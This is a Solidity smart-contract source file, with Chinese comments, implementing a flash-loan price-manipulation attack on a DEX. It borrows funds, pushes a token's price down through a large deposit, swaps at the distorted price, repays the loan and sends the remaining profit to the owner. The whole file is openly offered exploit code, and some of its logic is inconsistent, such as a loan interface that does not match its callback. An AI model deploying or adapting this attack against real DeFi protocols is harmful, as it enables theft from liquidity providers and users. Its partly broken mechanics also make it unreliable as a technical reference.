// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFlashLoanProvider {
    function flashLoan(uint256 amount, address receiver, bytes calldata data) external;
}

interface IVulnerableDEX {
    function swap(address tokenIn, address tokenOut, uint256 amount) external;
    function getPrice(address token) external view returns (uint256);
    function deposit(address token, uint256 amount) external;
}

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

/**
 * @title FlashLoanAttack
 * @notice 闪电贷价格操纵攻击
 * @dev 借入大量资金 -> 操纵DEX价格 -> 套利 -> 归还贷款
 */
contract FlashLoanAttack {
    address public owner;
    IFlashLoanProvider public lender;
    IVulnerableDEX public dex;

    uint256 public profit;
    bool public attackInProgress;

    event FlashLoanReceived(uint256 amount);
    event PriceManipulated(uint256 oldPrice, uint256 newPrice);
    event ProfitTaken(uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _lender, address _dex) {
        owner = msg.sender;
        lender = IFlashLoanProvider(_lender);
        dex = IVulnerableDEX(_dex);
    }

    /**
     * @notice 发起闪电贷攻击
     * @param loanAmount 借款金额
     * @param tokenA 被操纵的代币
     * @param tokenB 套利代币
     */
    function executeAttack(
        uint256 loanAmount,
        address tokenA,
        address tokenB
    ) external onlyOwner {
        require(!attackInProgress, "Attack in progress");
        attackInProgress = true;

        // 请求闪电贷
        lender.flashLoan(loanAmount, address(this), 
            abi.encode(tokenA, tokenB, loanAmount));
    }

    /**
     * @notice 闪电贷回调函数
     * @param amount 借款金额
     * @param data 攻击参数
     */
    function executeOperation(
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata data
    ) external returns (bool) {
        require(msg.sender == address(lender), "Invalid lender");
        require(initiator == address(this), "Invalid initiator");

        (address tokenA, address tokenB, uint256 loanAmount) = 
            abi.decode(data, (address, address, uint256));

        emit FlashLoanReceived(amount);

        // 1. 记录操纵前价格
        uint256 priceBefore = dex.getPrice(tokenA);

        // 2. 用借来的大量tokenA冲击DEX，压低价格
        IERC20(tokenA).approve(address(dex), amount);
        dex.deposit(tokenA, amount);

        // 3. 价格已被操纵，执行套利
        uint256 priceAfter = dex.getPrice(tokenA);
        emit PriceManipulated(priceBefore, priceAfter);

        // 4. 用少量tokenB换取大量tokenA（因为价格被压低）
        uint256 swapAmount = IERC20(tokenB).balanceOf(address(this));
        if (swapAmount > 0) {
            dex.swap(tokenB, tokenA, swapAmount);
        }

        // 5. 归还闪电贷 + 手续费
        uint256 repay = amount + fee;
        IERC20(tokenA).transfer(address(lender), repay);

        // 6. 剩余即为利润
        profit = IERC20(tokenA).balanceOf(address(this));
        emit ProfitTaken(profit);

        attackInProgress = false;
        return true;
    }

    function withdrawProfit(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        require(bal > 0, "No profit");
        IERC20(token).transfer(owner, bal);
    }
}
